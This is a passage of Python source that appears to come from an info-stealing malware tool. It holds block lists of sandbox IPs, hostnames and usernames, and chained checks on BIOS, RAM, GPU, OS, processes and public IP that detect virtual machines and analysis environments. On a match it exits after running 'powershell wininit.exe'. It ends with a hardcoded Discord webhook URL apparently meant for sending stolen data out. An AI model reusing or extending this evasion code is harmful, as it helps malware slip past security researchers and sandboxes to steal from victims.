...
blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50"]
blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"]
blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl"]
...
def exit_process():
    subprocess.run("powershell wininit.exe", shell=True)
    os._exit(0)

def ip_check():
    ip_address = execute_command('curl http://api.ipify.org/ --ssl-no-revoke')
    if check_listed(blackListedIPS, ip_address):
        exit_process()

def username_check():
    user_name = os.getenv('USERNAME')
    if check_listed(blackListedUsername, user_name):
        exit_process()

def hostname_check():
    host_name = socket.gethostname()
    if check_listed(blackListedHostname, host_name):
        exit_process()

def bios_check():
    bios_version = execute_command('wmic bios get smbiosbiosversion')
    if "Hyper-V" in bios_version:
        exit_process()
    else:
        speed_check()

def process_check():
    process_list = execute_command('tasklist /fo csv').split('\r\n')
    for line in process_list:
        process_name = line.split('","')[0].replace('"', '')
        if process_name in blackListedProcesses:
            exit_process()

def speed_check():
    memory_speed = execute_command('wmic MemoryChip get /format:list | find /i "Speed"')
    if "Speed=0" in memory_speed:
        exit_process()
    else:
        gpu_check()

def gpu_check():
    gpu_info = execute_command('wmic path win32_VideoController get name')
    gpu_list = [gpu.strip() for gpu in gpu_info.split(",")]
    if check_listed(blackListedGPU, gpu_list):
        exit_process()
    else:
        os_check()

def os_check():
    os_product_name = execute_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
    if os_product_name.strip() in blacklistedOS:
        exit_process()
    else:
        ram_check()
...
def ram_check():
    try:
        total_ram = int(os.popen('wmic ComputerSystem get TotalPhysicalMemory').read().split('\n')[2]) // (1024 ** 3)
        if total_ram > 1.2:
            ip_check()
        else:
            exit_process()
...
wh00k = "https://discord.com/api/webhooks/1204735031109750846/UOnsaR52E0AyNZuYd5LNc5h6oSM-k74yz45LLgd6BqcDY1HFJRh_yf4VFD8jFtK4Tl8o"
